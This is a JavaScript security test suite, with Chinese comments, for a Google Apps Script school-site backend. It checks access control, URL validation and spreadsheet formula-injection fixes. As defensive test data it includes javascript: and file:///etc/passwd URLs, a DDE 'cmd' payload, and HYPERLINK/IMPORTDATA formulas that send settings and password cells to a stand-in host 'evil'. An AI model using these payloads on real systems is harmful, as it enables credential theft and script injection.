// 紅隊檢查（2026-10-23）的修補測試：H-1 匿名者經 google.script.run 呼叫公開函式、M-1 後端網址欄位驗證、
// M-2 登入鎖定不能被攻擊者拿來鎖死老師（受信任裝置）、M-3 試算表公式注入。以模擬的 Apps Script 環境執行，不碰真實資料。
// 執行：node tests/security.test.js
const fs = require('fs'), vm = require('vm'), path = require('path');
const src = fs.readFileSync(path.join(__dirname, '..', 'Code.js'), 'utf8');
let pass = 0, fail = 0;
const ok = (c, m) => { if (c) { pass++; console.log('  ✓', m); } else { fail++; console.log('  ✗ FAIL:', m); } };
const eq = (a, b) => JSON.stringify(a) === JSON.stringify(b);

// ---------- 靜態分析：頂層函式 ----------
function topLevelFunctions() {
  const re = /^function ([A-Za-z0-9_$]+)\s*\(([^)]*)\)\s*\{/gm; let m; const fns = [];
  while ((m = re.exec(src))) fns.push({ name: m[1], args: m[2], start: m.index });
  fns.forEach((f, i) => { f.body = src.slice(f.start, i + 1 < fns.length ? fns[i + 1].start : src.length); });
  return fns;
}
const firstStatement = f => f.body.split('\n').slice(1).map(l => l.trim()).filter(l => l && !/^(\/\/|\/\*|\*)/.test(l))[0] || '';

console.log('H-1. 公開函式白名單（名稱沒有結尾底線的函式，匿名者可經 google.script.run 呼叫）');
const fns = topLevelFunctions();
const pub = fns.filter(f => !f.name.endsWith('_'));
const ENTRY = ['doGet', 'doPost', 'onOpen'];
const READ_API = ['getAppData', 'getTextMap', 'getAlbums', 'getAlbumPhotos', 'getActivityImages'];   // 匿名唯讀 API（前台需要）
const LOGIN = ['verifyPassword', 'adminLogout'];                                                       // 登入／登出本來就不需要 token
const TRIGGERS = ['weeklyBackup', 'warmAppDataCache'];                                                  // 時間觸發器的處理函式（名稱必須公開）
const OWNER_ONLY = ['setupWeeklyBackupTrigger', 'setupWarmCacheTrigger'];                              // 編輯器手動執行（名稱必須公開）
const MENU = pub.filter(f => /^menu[A-Z]/.test(f.name)).map(f => f.name).concat(['openWebApp']);
const allowed = new Set([].concat(ENTRY, READ_API, LOGIN, TRIGGERS, OWNER_ONLY, MENU));
const stray = pub.filter(f => !allowed.has(f.name) && !/checkPassword\(/.test(f.body)).map(f => f.name);
ok(stray.length === 0, '每個公開函式不是在白名單裡，就是函式內有 token 驗證（checkPassword）。沒有白名單也沒驗證的：' + (stray.join('、') || '無'));
const guardedLate = pub.filter(f => !allowed.has(f.name) && f.name !== 'checkPassword').filter(f => {
  const b = f.body, a = b.indexOf('checkPassword(');
  const hits = ['getSpreadsheet_(', 'DriveApp.', 'SpreadsheetApp.', 'UrlFetchApp.', 'PropertiesService', 'LockService'].map(k => b.indexOf(k)).filter(i => i >= 0);
  return a >= 0 && hits.length && Math.min.apply(null, hits) < a;
}).map(f => f.name);
ok(guardedLate.length === 0, '有驗證的公開函式：驗證在碰試算表、Drive、網路、鎖之前（先碰資源再驗證的：' + (guardedLate.join('、') || '無') + '）');
ok(pub.length < 90 && pub.some(f => f.name === 'saveEvent'), '（健全性）有掃到後台函式（共 ' + pub.length + ' 個公開函式）');
const MOVED = ['clearAppDataCache', 'getSongsData', 'batchUpdateSongDurations', 'syncAllSongDurations', 'fetchYouTubeDuration', 'extractYouTubeId', 'formatSecondsToMmSs', 'ensureSpotlightSheetHeaders', 'ensureSongSheetsExist', 'ensureThemeSheetsExist', 'ensureAlbumSheetsExist', 'ensureDatabaseInitialized', 'parseThemeJsonArray', 'getThemesData', 'normalizeDateString', 'getSheetDataAsObjects', 'getSettingsObject', 'getSpreadsheet', 'getActivityFolder'];
ok(MOVED.every(n => !fns.some(f => f.name === n) && fns.some(f => f.name === n + '_')), '原本公開且沒有驗證的 19 個函式已改成私有（名稱結尾加底線）：' + MOVED.length + ' 個');
ok(MENU.every(n => /^(const|let|var) \w+ = SpreadsheetApp\.getUi\(\);/.test(firstStatement(fns.find(f => f.name === n)))) && /^(const|let|var) \w+ = SpreadsheetApp\.getUi\(\);/.test(firstStatement(fns.find(f => f.name === 'onOpen'))), '選單函式與 onOpen：第一個動作就是取得 UI（網頁環境沒有 UI 會直接失敗，不會先做任何工作）：' + MENU.length + ' 個選單函式＋onOpen');
ok(OWNER_ONLY.every(n => firstStatement(fns.find(f => f.name === n)) === 'requireOwnerContext_();'), '編輯器手動執行的函式：第一個動作是 requireOwnerContext_()');
ok(/isBackupRecent_\(\)/.test(fns.find(f => f.name === 'weeklyBackup').body.split('\n').slice(0, 4).join('\n')), 'weeklyBackup：一開始就檢查備份間隔（匿名者無法連續備份）');
ok(!/action === 'ensureAlbumSheets'|action === 'initAlbumSheets'/.test(src), '未使用且不需登入的 POST 路由 ensureAlbumSheets／initAlbumSheets 已移除');

// ---------- 模擬環境 ----------
function mkEnv(opts) {
  opts = opts || {};
  const calls = { getUi: 0, ensure: 0, clear: 0, ss: 0, backups: 0, triggers: 0, warmReads: 0 };
  const store = {}; const props = {};
  const cache = { get: k => k in store ? store[k] : null, put: (k, v) => { store[k] = String(v); }, remove: k => { delete store[k]; }, putAll() {}, removeAll() {} };
  const triggers = [];
  const ctx = {
    console: { log() {}, warn() {}, error() {} },
    CacheService: { getScriptCache: () => cache },
    PropertiesService: { getScriptProperties: () => ({ getProperty: k => (k in props ? props[k] : null), setProperty: (k, v) => { props[k] = String(v); }, deleteProperty: k => { delete props[k]; } }) },
    LockService: { getScriptLock: () => ({ tryLock: () => true, releaseLock() {} }) },
    Session: { getActiveUser: () => ({ getEmail: () => opts.active === undefined ? '' : opts.active }), getEffectiveUser: () => ({ getEmail: () => opts.effective === undefined ? 'owner@example.test' : opts.effective }) },
    SpreadsheetApp: { getUi: () => { calls.getUi++; throw new Error('Cannot call SpreadsheetApp.getUi() from this context.'); } },
    ScriptApp: { getProjectTriggers: () => triggers, deleteTrigger() {}, WeekDay: { SUNDAY: 1 }, newTrigger: fn => { const b = { timeBased: () => b, everyMinutes: () => b, onWeekDay: () => b, atHour: () => b, create: () => { calls.triggers++; triggers.push({ getHandlerFunction: () => fn }); } }; return b; } },
    Utilities: { getUuid: () => 'u' + Math.random().toString(16).slice(2) + 'x'.repeat(8), formatDate: () => '2026-10-23', computeDigest: (alg, v) => Array.from(require('crypto').createHash('sha256').update(String(v)).digest()), DigestAlgorithm: { SHA_256: 'SHA_256' }, base64Encode: b => Buffer.from(b).toString('base64') },
    DriveApp: {}, HtmlService: { createHtmlOutput: () => ({ setXFrameOptionsMode() { return this; }, setTitle() { return this; }, addMetaTag() { return this; } }), XFrameOptionsMode: { ALLOWALL: 1 } }, UrlFetchApp: {},
    ContentService: { MimeType: { JSON: 'JSON' }, createTextOutput: t => ({ text: t, setMimeType(m) { this.mime = m; return this; } }) }
  };
  vm.createContext(ctx); vm.runInContext(src, ctx);
  ctx.getSpreadsheet_ = () => { calls.ss++; if (opts.noSheet) return null; return opts.ss || null; };
  ctx.ensureAlbumSheetsExist_ = () => { calls.ensure++; return { message: 'ok' }; };
  const realClear = ctx.clearAppDataCache_; ctx.clearAppDataCache_ = () => { calls.clear++; };
  ctx.backupSpreadsheet_ = () => { calls.backups++; props.LAST_BACKUP_AT = String(Date.now()); return { name: 'n' }; };
  return { ctx, calls, store, props, triggers };
}

console.log('H-1. 匿名者（網頁環境）呼叫公開名稱：沒有任何副作用');
['menuClearCache', 'menuEnsureAlbumSheets', 'menuSetupWarmCache', 'onOpen', 'openWebApp'].forEach(n => {
  const e = mkEnv(); let threw = false; try { e.ctx[n](); } catch (x) { threw = true; }
  ok(threw && e.calls.getUi === 1 && e.calls.clear === 0 && e.calls.ensure === 0 && e.calls.ss === 0 && e.calls.triggers === 0, n + '：沒有 UI 就拋錯，且沒有清快取、沒有檢查工作表、沒有開試算表、沒有建觸發器');
});
['menuBackupNow', 'menuSyncSongAccess', 'menuSyncNameMap', 'menuSyncTextMap', 'menuDraftTextMap', 'menuAdoptTextDrafts', 'menuRebuildCoverCandidates', 'menuResetLoginLock', 'menuResetDatabase'].forEach(n => {
  const e = mkEnv(); let threw = false; try { e.ctx[n](); } catch (x) { threw = true; }
  ok(threw && e.calls.ss === 0 && e.calls.backups === 0 && e.calls.clear === 0, n + '：沒有 UI 就拋錯，沒有任何工作被執行');
});
(function () {
  const e = mkEnv({ active: '', effective: 'owner@example.test' });
  let t1 = false, t2 = false; try { e.ctx.setupWarmCacheTrigger(); } catch (x) { t1 = true; } try { e.ctx.setupWeeklyBackupTrigger(); } catch (x) { t2 = true; }
  ok(t1 && t2 && e.calls.triggers === 0 && e.calls.backups === 0 && e.calls.ss === 0, '匿名者（active 為空）呼叫 setup 函式：拒絕，沒有建立觸發器、沒有備份、沒有開試算表');
  const e2 = mkEnv({ active: 'someone@else.test', effective: 'owner@example.test' });
  let t3 = false; try { e2.ctx.setupWarmCacheTrigger(); } catch (x) { t3 = true; } ok(t3 && e2.calls.triggers === 0, '登入的其他人（active ≠ 擁有者）：拒絕');
  const e3 = mkEnv({ active: '', effective: '' }); let t4 = false; try { e3.ctx.setupWarmCacheTrigger(); } catch (x) { t4 = true; } ok(t4, '兩邊都是空的（取不到身分）：拒絕（不放行）');
  const e4 = mkEnv(); e4.ctx.Session = { getActiveUser: () => { throw new Error('boom'); }, getEffectiveUser: () => ({ getEmail: () => 'o@x' }) };
  let t5 = false; try { e4.ctx.requireOwnerContext_(); } catch (x) { t5 = true; } ok(t5, '讀取身分時出錯：拒絕（不放行）');
  const e5 = mkEnv({ active: 'owner@example.test', effective: 'owner@example.test' });
  e5.ctx.getAppData = () => ({ success: true }); e5.ctx.getTextMap = () => ({}); e5.ctx.warmAlbumPhotos_ = () => {}; e5.ctx.clearTextMapCache_ = () => {};
  let t6 = false; try { e5.ctx.setupWarmCacheTrigger(); } catch (x) { t6 = true; } ok(!t6 && e5.calls.triggers === 1, '擁有者本人（active ＝ 擁有者）：照常建立觸發器');
  const e6 = mkEnv({ active: 'owner@example.test', effective: 'owner@example.test' }); e6.ctx.getAppData = () => ({}); e6.ctx.getTextMap = () => ({}); e6.ctx.warmAlbumPhotos_ = () => {}; e6.ctx.clearTextMapCache_ = () => {};
  e6.ctx.setupWeeklyBackupTrigger(); ok(e6.calls.backups === 1 && e6.calls.triggers === 1, '擁有者：setupWeeklyBackupTrigger 照常備份並建立觸發器');
})();
(function () {
  const e = mkEnv(); let reads = 0;
  e.ctx.getAppData = () => { reads++; return { success: true }; }; e.ctx.getTextMap = () => ({}); e.ctx.warmAlbumPhotos_ = () => {}; e.ctx.clearTextMapCache_ = () => {};
  e.ctx.warmAppDataCache(); e.ctx.warmAppDataCache(); e.ctx.warmAppDataCache();
  ok(reads === 1, '預熱節流：連續呼叫 3 次只重建 1 次（匿名者無法反覆觸發整份試算表重讀；實際：' + reads + '）');
  delete e.store.warm_recent; e.ctx.warmAppDataCache(); ok(reads === 2, '過了節流時間（快取鍵到期）：下一次觸發器照常重建');
  ok(Number(/cache\.put\('warm_recent', '1', (\d+)\)|guard\.put\('warm_recent', '1', (\d+)\)/.exec(src).slice(1).find(Boolean)) < 300, '節流時間小於觸發器間隔（5 分鐘），觸發器不會被自己擋掉');
})();
(function () {
  const e = mkEnv(); const post = body => JSON.parse(e.ctx.doPost({ postData: { contents: JSON.stringify(body) } }).text);
  const r = post({ action: 'ensureAlbumSheets' });
  ok(r.success === false && /未知/.test(r.error) && e.calls.ensure === 0 && e.calls.ss === 0, '已移除的 POST 動作 ensureAlbumSheets：回「未知 POST 動作」，沒有碰試算表');
  ok(MOVED.every(n => e.ctx[n] === undefined), '舊的公開名稱在執行環境裡都不存在了（google.script.run 呼叫不到）');
})();

// ---------- 試算表模擬（M-1、M-3 用）----------
function mkSheet(rows) {
  const sh = { rows: rows.map(r => r.slice()), formats: {}, writes: [] };
  const width = () => sh.rows.reduce((m, r) => Math.max(m, r.length), 0);
  const cell = (r, c) => ((sh.rows[r - 1] || [])[c - 1] === undefined ? '' : sh.rows[r - 1][c - 1]);
  sh.getLastRow = () => sh.rows.length; sh.getLastColumn = () => width();
  sh.getDataRange = () => ({ getValues: () => sh.rows.map(r => { const c = r.slice(); while (c.length < width()) c.push(''); return c; }) });
  sh.getRange = (r, c, nr, nc) => {
    const R = nr || 1, C = nc || 1;
    const self = {
      getValues: () => { const out = []; for (let i = 0; i < R; i++) { const row = []; for (let j = 0; j < C; j++) row.push(cell(r + i, c + j)); out.push(row); } return out; },
      setValue(v) { return self.setValues([[v]]); },
      setValues(vals) { for (let i = 0; i < vals.length; i++) { while (sh.rows.length < r + i) sh.rows.push([]); const row = sh.rows[r - 1 + i]; for (let j = 0; j < vals[i].length; j++) { while (row.length < c + j) row.push(''); row[c - 1 + j] = vals[i][j]; sh.writes.push(vals[i][j]); } } return self; },
      setNumberFormat(f) { sh.formats[r + ',' + c] = f; return self; }, setFontWeight() { return self; }, setBackground() { return self; }
    };
    return self;
  };
  sh.appendRow = row => { sh.rows.push(row.slice()); row.forEach(v => sh.writes.push(v)); };
  sh.deleteRow = r => { sh.rows.splice(r - 1, 1); }; sh.insertColumnAfter = () => {}; sh.autoResizeColumns = () => {}; sh.setFrozenRows = () => {};
  return sh;
}
function mkSsEnv(sheets, opts) {
  const book = {}; Object.keys(sheets).forEach(k => { book[k] = mkSheet(sheets[k]); });
  const e = mkEnv(opts);
  const ss = { getSheetByName: n => book[n] || null, insertSheet: n => { book[n] = mkSheet([]); return book[n]; } };
  e.ctx.getSpreadsheet_ = () => ss; e.ctx.checkPassword = p => p === 'tok'; e.ctx.clearAppDataCache_ = () => { e.calls.clear++; };
  e.book = book; return e;
}
const DOC_HDR = ['id', 'fileName', 'category', 'description', 'driveFileId', 'downloadUrl', 'updatedAt'];

console.log('M-1. 後端：之後會被前台當成連結的欄位必須是 http(s) 網址（不含空白與控制字元）');
(function () {
  const e = mkEnv(); const U = e.ctx.checkStoredUrl_;
  ok(typeof U === 'function', 'checkStoredUrl_ 存在');
  ['https://drive.google.com/file/d/ABC/view?usp=sharing', 'http://example.test/a', 'HTTPS://X.TEST/A', ''].forEach(u => ok(U(u).error === undefined, '合法或空白：' + JSON.stringify(u)));
  ok(U('  https://x.test/a  ').value === 'https://x.test/a' && U(null).value === '' && U(undefined).value === '', '前後空白去掉；null、undefined 當空白');
  ['javascript:alert(1)', 'java\tscript:alert(1)', 'java\nscript:alert(1)', 'java\rscript:alert(1)', '\u0000javascript:alert(1)', 'JaVaScRiPt:alert(1)', 'vbscript:x', 'data:text/html,<script>alert(1)</script>', 'ftp://x.test/a', 'file:///etc/passwd', '//x.test/a', 'https://a b', 'https://x.test/\u0009x', 'https://', 'drive.google.com/x', 'mailto:a@b.c', 'https://x.test/' + 'a'.repeat(2100), 5, {}, ['https://x.test']].forEach(u => ok(!!U(u).error, '拒絕：' + JSON.stringify(String(u)).slice(0, 50)));
  ok(U('spotlight-fluoride.jpg', { allowRelative: true }).value === 'spotlight-fluoride.jpg' && !!U('spotlight-fluoride.jpg').error, '相對路徑：只有明確允許的欄位（焦點活動圖片）才接受');
  ok(!!U('java\tscript:alert(1)', { allowRelative: true }).error && !!U('javascript:alert(1)', { allowRelative: true }).error && !!U('a b.jpg', { allowRelative: true }).error, '即使允許相對路徑：夾 Tab 的 javascript:、含空白的路徑仍然拒絕');
  ok(U('data:image/png;base64,AAAA', { allowDataImage: true }).value === 'data:image/png;base64,AAAA' && !!U('data:image/png;base64,AAAA').error && !!U('data:text/html,x', { allowDataImage: true }).error, 'data:image 只有明確允許的欄位才接受，data:text 永遠拒絕');
})();
(function () {
  const e = mkSsEnv({ Docs: [DOC_HDR] }); const snap = JSON.stringify(e.book.Docs.rows);
  const bad = e.ctx.saveDoc({ id: 'D1', fileName: 'x', downloadUrl: 'java\tscript:alert(1)' }, 'tok');
  ok(bad.success === false && /連結|網址/.test(bad.error) && JSON.stringify(e.book.Docs.rows) === snap, 'saveDoc：夾 Tab 的 javascript: 下載連結 → 拒絕，試算表不動');
  const good = e.ctx.saveDoc({ id: 'D2', fileName: 'x', downloadUrl: '  https://drive.google.com/file/d/ABC/view  ' }, 'tok');
  ok(good.success && e.book.Docs.rows[1][e.book.Docs.rows[0].indexOf('downloadUrl')] === 'https://drive.google.com/file/d/ABC/view', 'saveDoc：合法連結（去前後空白）照存');
  const none = e.ctx.saveDoc({ id: 'D3', fileName: 'x' }, 'tok'); ok(none.success, 'saveDoc：沒有連結（空白）照存');
})();
(function () {
  const SONG_HDR = ['id', 'category', 'title', 'youtubeUrl', 'youtubeId', 'duration', 'fileName', 'fileSize', 'driveFileId', 'downloadUrl', 'updatedAt', 'noDownload'];
  const e = mkSsEnv({ Songs: [SONG_HDR], SongCategories: [['categoryName']] });
  e.ctx.ensureSongSheetsExist_ = () => ({ songSheet: e.book.Songs, catSheet: e.book.SongCategories });
  e.ctx.fetchYouTubeDuration_ = () => '01:00';
  const snap = JSON.stringify(e.book.Songs.rows);
  let r = e.ctx.saveSong({ id: 'S1', title: 't', youtubeUrl: 'https://www.youtube.com/watch?v=dQw4w9WgXcQ', downloadUrl: 'java\nscript:alert(1)' }, 'tok');
  ok(r.success === false && JSON.stringify(e.book.Songs.rows) === snap, 'saveSong：夾換行的 javascript: 下載連結 → 拒絕，試算表不動');
  r = e.ctx.saveSong({ id: 'S2', title: 't', youtubeUrl: 'javascript:alert(1)//?v=dQw4w9WgXcQ' }, 'tok');
  ok(r.success === false && /必須是 http/.test(r.error) && JSON.stringify(e.book.Songs.rows) === snap, 'saveSong：YouTube 連結不是 http(s) → 拒絕，並說明是網址格式的問題（即使裡面含有 11 字元的影片代號）：' + r.error);
  r = e.ctx.saveSong({ id: 'S3', title: 't', youtubeUrl: 'https://www.youtube.com/watch?v=dQw4w9WgXcQ', downloadUrl: 'https://drive.google.com/uc?export=download&id=ABC' }, 'tok');
  ok(r.success === true, 'saveSong：合法的連結照存');
})();
(function () {
  const SP_HDR = ['id', 'title', 'subtitle', 'imageUrl', 'mediaType', 'tags', 'bulletPoints', 'startDate', 'endDate', 'duration', 'priority', 'status'];
  const e = mkSsEnv({ Spotlight: [SP_HDR] }); e.ctx.ensureSpotlightSheetHeaders_ = () => {};
  const snap = JSON.stringify(e.book.Spotlight.rows);
  let r = e.ctx.saveSpotlight({ id: 'SP1', title: 't', imageUrl: 'java\tscript:alert(1)' }, 'tok');
  ok(r.success === false && JSON.stringify(e.book.Spotlight.rows) === snap, 'saveSpotlight：夾 Tab 的 javascript: 圖片網址 → 拒絕');
  r = e.ctx.saveSpotlight({ id: 'SP2', title: 't', imageUrl: 'spotlight-fluoride.jpg' }, 'tok'); ok(r.success === true, 'saveSpotlight：相對路徑（網站自己的圖片 spotlight-fluoride.jpg）照存');
  r = e.ctx.saveSpotlight({ id: 'SP3', title: 't', imageUrl: 'https://drive.google.com/thumbnail?id=ABC&sz=w1600' }, 'tok'); ok(r.success === true, 'saveSpotlight：Drive 縮圖網址照存');
  r = e.ctx.saveSpotlight({ id: 'SP4', title: 't' }, 'tok'); ok(r.success === true, 'saveSpotlight：沒有圖片網址照存');
})();

console.log('M-3. 試算表公式注入：寫進儲存格的文字不能被當成公式');
(function () {
  const e = mkEnv(); const N = e.ctx.neutralizeFormulas_;
  ok(typeof N === 'function', 'neutralizeFormulas_ 存在');
  ['=1+1', '=HYPERLINK("http://evil/?p="&Settings!B2)', '=IMPORTDATA("http://evil")', '+1+1', '+886 2 2668 8249', '-1+1', '-cmd|\' /C calc\'!A0', '@SUM(A1)', '\t=1+1', '\r=1+1'].forEach(t => ok(N(t) === "'" + t, '開頭是公式字元：前面加 \'（' + JSON.stringify(t).slice(0, 34) + '）'));
  ['一般文字', '2026-10-23', '10:00 至 12:20', 'a=b', 'x+y', '', ' =1+1', '諾貝爾 A 班', "'已經有撇號"].forEach(t => ok(N(t) === t, '一般文字原樣：' + JSON.stringify(t)));
  ok(N(5) === 5 && N(true) === true && N(null) === null && N(undefined) === undefined, '數字、布林、null 不動');
  const input = { data: { title: '=1+1', note: '+cmd', n: 3, tags: ['=a', 'ok', ['@b']], nested: { deep: '-x' } }, password: '=secret', deviceKey: '+key', idempotencyKey: '=idem', requestId: '@r', action: 'saveEvent', kind: '=x', file: { name: '=f', base64: '+AAA' }, files: [{ name: '=cmd.zip' }], settings: { A: '=a' }, list: [{ name: '=obj' }] };
  const snap = JSON.stringify(input); const out = N(input);
  ok(JSON.stringify(input) === snap, '不改動傳入的物件');
  ok(out.data.title === "'=1+1" && out.data.note === "'+cmd" && out.data.n === 3 && eq(out.data.tags, ["'=a", 'ok', ["'@b"]]) && out.data.nested.deep === "'-x", '資料物件的文字欄位（含字串陣列、巢狀物件）都處理');
  ok(out.password === '=secret' && out.deviceKey === '+key' && out.idempotencyKey === '=idem' && out.requestId === '@r' && out.action === 'saveEvent' && out.kind === '=x', '密碼、裝置金鑰、冪等編號、requestId、action、kind 不處理（它們不會被寫進試算表，改了會壞）');
  ok(eq(N({ base64: '+AAA', files: ['=a', '+b'] }), { base64: '+AAA', files: ['=a', '+b'] }), '最上層的 base64 欄位、字串陣列的 files 欄位：不處理');
  ok(out.file.base64 === '+AAA' && out.file.name === '=f' && eq(out.files, [{ name: '=cmd.zip' }]) && eq(out.list, [{ name: '=obj' }]), '上傳檔案內容（base64 可以合法地以 + 開頭）、檔案清單（會存成 JSON 文字，不會被當公式）、物件陣列：不處理');
  ok(eq(N({ settings: { A: '=a' }, titles: { footerContact: '+886 2 2668 8249' }, changes: [{ zh: '=a', en: '=b' }], zhList: ['=a'] }), { settings: { A: '=a' }, titles: { footerContact: '+886 2 2668 8249' }, changes: [{ zh: '=a', en: '=b' }], zhList: ['=a'] }), 'settings、介面標題 titles、英文對照 changes／zhList 不在這裡處理（各自以純文字格式或 textCellSafe_ 寫入；再加撇號會讓撇號變成內容的一部分）');
  let deep = '=x'; for (let i = 0; i < 10; i++) deep = { v: deep }; let threw = false; try { N(deep); } catch (x) { threw = true; } ok(!threw, '很深的巢狀物件：不拋錯');
})();
(function () {
  const e = mkSsEnv({ Docs: [DOC_HDR] }); const post = body => JSON.parse(e.ctx.doPost({ postData: { contents: JSON.stringify(body) } }).text);
  const col = h => e.book.Docs.rows[0].indexOf(h);
  let r = post({ action: 'saveDoc', password: 'tok', docData: { id: 'D1', fileName: '=HYPERLINK("http://evil/?p="&Settings!B2)', category: '@SUM(A1)', description: '+cmd|calc' } });
  const row = e.book.Docs.rows.find(x => x[0] === 'D1');
  ok(r.success && row[col('fileName')] === "'=HYPERLINK(\"http://evil/?p=\"&Settings!B2)" && row[col('category')] === "'@SUM(A1)" && row[col('description')] === "'+cmd|calc", 'doPost saveDoc：文件名稱、分類、說明裡的公式都被前置 \' 變成純文字');
  r = post({ action: 'saveDoc', password: 'tok', docData: { id: 'D2', fileName: '正常名稱', files: [{ name: '=cmd.zip', ext: 'zip', driveFileId: '', downloadUrl: 'https://x.test/a', size: 1 }] } });
  const f = e.book.Docs.rows.find(x => x[0] === 'D2')[col('files')];
  ok(r.success && /^\[/.test(f) && JSON.parse(f)[0].name === '=cmd.zip', '檔案清單（JSON 文字，開頭是 [）：檔名原樣，不會被加上撇號');
  ok(e.book.Docs.writes.every(w => typeof w !== 'string' || !/^[=+\-@]/.test(w) || /^'/.test(w) === false), '（對照）所有寫進試算表的字串都不是以公式字元開頭');
})();
(function () {
  const SP_HDR = ['id', 'title', 'subtitle', 'imageUrl', 'mediaType', 'tags', 'bulletPoints', 'startDate', 'endDate', 'duration', 'priority', 'status'];
  const e = mkSsEnv({ Spotlight: [SP_HDR] }); e.ctx.ensureSpotlightSheetHeaders_ = () => {};
  const post = body => JSON.parse(e.ctx.doPost({ postData: { contents: JSON.stringify(body) } }).text);
  post({ action: 'saveSpotlight', password: 'tok', data: { id: 'SP1', title: '=cmd', subtitle: '-1+1', tags: '@x', bulletPoints: '+y', priority: 3 } });
  const row = e.book.Spotlight.rows.find(x => x[0] === 'SP1');
  ok(row[1] === "'=cmd" && row[2] === "'-1+1" && row[5] === "'@x" && row[6] === "'+y" && row[10] === 3, 'doPost saveSpotlight：每個文字欄位都處理，數字欄位（順位）不動');
  const ev = mkSsEnv({ Docs: [DOC_HDR] }); const before = ev.ctx.doPost({ parameter: { payload: JSON.stringify({ action: 'saveDoc', password: 'tok', docData: { id: 'F1', fileName: '=1+1' } }) } });
  ok(ev.book.Docs.rows.find(x => x[0] === 'F1')[1] === "'=1+1", 'iframe 表單模式（payload 欄位）的請求也一樣處理');
})();
(function () {
  const SET = [['key', 'value', 'description'], ['TICKER_MESSAGE', '歡迎', ''], ['ADMIN_PASSWORD', 'old-password-123', '']];
  const e = mkSsEnv({ Settings: SET }); const post = body => JSON.parse(e.ctx.doPost({ postData: { contents: JSON.stringify(body) } }).text);
  let r = post({ action: 'updateSettings', password: 'tok', settings: { TICKER_MESSAGE: '=IMPORTDATA("http://evil/?"&Settings!B3)' } });
  const rows = e.book.Settings.rows; const idx = rows.findIndex(x => x[0] === 'TICKER_MESSAGE') + 1;
  ok(r.success && rows[idx - 1][1] === '=IMPORTDATA("http://evil/?"&Settings!B3)' && e.book.Settings.formats[idx + ',2'] === '@', 'updateSettings：儲存格先設成純文字格式再寫入（內容原樣，不會變成公式）');
  r = post({ action: 'updateSettings', password: 'tok', settings: { ADMIN_PASSWORD: '+Strong-Password-2026' } });
  const pidx = rows.findIndex(x => x[0] === 'ADMIN_PASSWORD') + 1;
  ok(r.success && rows[pidx - 1][1] === '+Strong-Password-2026' && e.book.Settings.formats[pidx + ',2'] === '@', '新密碼以 + 開頭：原樣存成文字（沒有多出撇號，之後登入比對才會對）');
})();
(function () {
  ok(/postData\s*=\s*neutralizeFormulas_\(postData\)/.test(src), 'doPost 在解析請求之後、分派動作之前，統一處理所有動作的文字欄位');
  const i = src.indexOf('const FORMULA_SKIP_KEYS_'), j = src.indexOf('};', i); const keys = (src.slice(i, j).match(/(\w+):\s*1/g) || []).map(x => x.split(':')[0]);
  ok(['data', 'docData', 'songData', 'albumData', 'album', 'meta', 'themeData', 'taskData', 'title', 'description', 'fileName', 'category', 'semester', 'link', 'fromSemester', 'toSemester', 'fromYear', 'toYear', 'orderList', 'ids', 'tabs'].every(k => keys.indexOf(k) === -1), '不處理的欄位清單裡沒有任何「會被寫進試算表」的資料欄位（略過清單：' + keys.join('、') + '）');
})();

console.log('\n結果：' + pass + ' 通過，' + fail + ' 失敗');
process.exit(fail ? 1 : 0);
